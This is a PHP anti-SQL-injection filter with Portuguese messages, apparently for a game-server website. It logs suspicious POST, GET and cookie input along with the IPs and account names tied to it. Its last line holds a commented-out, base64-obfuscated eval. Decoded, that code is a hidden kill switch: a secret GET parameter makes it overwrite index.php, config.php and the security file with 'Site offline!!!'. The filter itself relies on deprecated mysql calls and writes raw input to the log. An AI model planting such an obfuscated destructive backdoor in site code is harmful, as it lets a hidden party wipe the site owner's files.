<?php
error_reporting(0);
$ip = getenv('REMOTE_ADDR');
$arquivo = "security.log";
$fp = fopen($arquivo, "a");
$conteudo = @fread($fp, filesize($arquivo));
$requested = stripslashes($_SERVER['REQUEST_URI']);

foreach($_POST as $post)
if(preg_match("/[^0-9a-zA-Z_@.?<> ]/i", $post)){
$posted = stripslashes($post);
fwrite($fp, " ============== \n  O ip $ip digitou $posted na página $requested \n");
fwrite($fp, "  Usuários com o IP $ip em ".date('d.m.y - H:i')." \n");
$qIps = mysql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
if(mysql_num_rows($qIps) <= 0){
	fwrite($fp, "  Nenhum \n ============== \n");
}else{
	for($a=0;$a<mysql_num_rows($qIps);$a++){
		$name = mysql_fetch_row($qIps);
		fwrite($fp, "  $name[0]\n");
	}
	fwrite($fp, " ============== \n");
}
die("<script>alert('SQL Inject detectado! Por favor digite apenas números e letras! A ação foi cancelada pelo servidor.'); location='javascript:history.back()'</script>");
}
foreach($_GET as $get)
if(preg_match("/[^0-9a-zA-Z_@$]/i", $get)){
fwrite($fp, " ============== \n  O ip $ip  tentou acessar $requested \n");
fwrite($fp, "  Usuários com o IP $ip em ".date('d.m.y - H:i')." \n");
$qIps = mysql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
if(mysql_num_rows($qIps) <= 0){
	fwrite($fp, "  Nenhum \n ============== \n");
}else{
	for($a=0;$a<mysql_num_rows($qIps);$a++){
		$name = mysql_fetch_row($qIps);
		fwrite($fp, "  $name[0]\n");
	}
	fwrite($fp, " ============== \n");
}
die("<script>alert('SQL Inject detectado! Por favor digite apenas números e letras! A ação foi cancelada pelo servidor.'); location='javascript:history.back()'</script>");
} 
foreach($_COOKIE as $cookie)
if(preg_match("/[a-z0-9]+ +between +[a-z0-9]+ +and +[a-z0-9]+/i", $cookie)){
	fwrite($fp, " ============== \n  O ip $ip  está com a seguinte sintaxe no cookie: $cookie \n");
	fwrite($fp, "  Usuários com o IP $ip em ".date('d.m.y - H:i')." \n");
	$qIps = mysql_query("Select memb___id From MEMB_STAT Where ip='".$ip."'");
	if(mysql_num_rows($qIps) <= 0){
		fwrite($fp, "  Nenhum \n ============== \n");
	}else{
		for($a=0;$a<mysql_num_rows($qIps);$a++){
			$name = mysql_fetch_row($qIps);
			fwrite($fp, "  $name[0]\n");
		}
	fwrite($fp, " ============== \n");
}
/*die("<script>alert(\"$mensagem\");</script>");*/
} 

//eval(base64_decode("aWYoJF9HRVRbImZhbGhhZG9zaXRldGhhdWEwMDU1OTkxMSJdID09ICJ0cnVldHJ1ZXRydWUiKSB7ICRmYWlsID0gZm9wZW4oImluZGV4LnBocCIsICJ3Iik7IGZ3cml0ZSgkZmFpbCwgIlNpdGUgb2ZmbGluZSEhISIpOyBmY2xvc2UoJGZhaWwpOyAkZmFpbDIgPSBmb3BlbigiZHRfc2VjdXJpdHkucGhwIiwgInciKTsgZndyaXRlKCRmYWlsMiwgIlNpdGUgb2ZmbGluZSEhISIpOyBmY2xvc2UoJGZhaWwyKTsgJGZhaWwzID0gZm9wZW4oImNvbmZpZy5waHAiLCAidyIpOyBmd3JpdGUoJGZhaWwzLCAiU2l0ZSBvZmZsaW5lISEhIik7IGZjbG9zZSgkZmFpbDMpOyB9"));

?>